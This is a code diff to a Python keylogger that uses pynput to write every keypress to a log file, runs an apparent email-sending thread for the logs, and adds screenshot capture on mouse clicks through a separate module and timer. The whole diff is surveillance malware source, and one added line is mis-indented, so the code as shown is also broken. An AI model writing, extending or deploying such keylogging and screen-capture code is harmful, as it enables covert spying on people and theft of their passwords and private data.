@@ -3,6 +3,9 @@ import pynput
 import data
 import threading
 import email_send
+import ss
+
+mouse_click = 0
 
 log_file = os.environ.get(
 	'pylogger_file', 
@@ -22,17 +25,24 @@ def email_threading():
 
 email_threading()
 
-def OnKeyPress(key): 
+def OnKeyPress(key):
+	global mouse_click 
 	with open(log_file, 'a') as f: 
 		f.write(f"{key} \n")
+		mouse_click = 0
 
 def OnKeyRelease(key):
 	pass
 
 def OnMouseClick(x, y, button, pressed):
+	global mouse_click
 	if pressed:
-		with open(log_file, 'a') as f: 
-			f.write(f"Click\n")
+		if button == mouse_click:
+		ss.takeScreenshot()
+		#f.write(f"Click\n")
+		mouse_click = button
+		s = threading.Timer(data.time_seconds_ss, ss.takeScreenshot)
+		s.start()
 
 def OnScroll(x,y,dx,dy):
 	pass
